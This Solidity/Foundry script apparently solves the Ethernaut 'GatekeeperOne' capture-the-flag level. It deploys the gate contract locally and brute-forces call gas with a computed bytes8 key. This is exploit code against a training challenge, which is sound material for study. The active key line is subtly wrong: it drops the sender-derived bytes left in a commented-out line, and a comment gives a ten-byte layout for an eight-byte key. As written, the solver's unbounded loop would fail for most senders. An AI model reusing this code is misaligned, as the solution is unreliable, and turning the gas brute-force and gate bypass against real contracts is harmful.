// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract GatekeeperOne {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Solver {
  address public target;

  constructor(address _target) {
    target = _target;
  }

  function solve(bytes8 solution) public {
    for (uint256 gasLeft = 10000; ; gasLeft++) {
      (bool success, ) = target.call{gas: gasLeft}(abi.encodeWithSignature("enter(bytes8)", solution));
      if (success) {
        console.log("Gas used is %s", gasLeft);
        break;
      }
    }

    assembly {
      return(0, 0)
    }
  }
}

contract Solve is Script, Test {
  address target = address(0xdc02028f5969A5Bb4C28B4484717555F90dBCa87);

  function run() public {
    vm.startBroadcast();

    console.log("Sender address is %s", msg.sender);
    bytes2 last2Bytes = bytes2(uint16(uint160(msg.sender) & 0xFFFF));
    emit log_named_bytes("Last 2 bytes", abi.encodePacked(last2Bytes));

    // 0x FF FF FF FF FF 00 00 {XX XX}
    // bytes8 answer = bytes8(uint64(0xFFFFFFFF00000000) | uint64(uint16(last2Bytes)));
    bytes8 answer = bytes8(uint64(0xFFFFFFFF00000000));
    emit log_named_bytes("Answer", abi.encodePacked(answer));

    target = address(new GatekeeperOne());
    Solver s = new Solver(target);
    s.solve(answer);

    vm.stopBroadcast();
  }
}
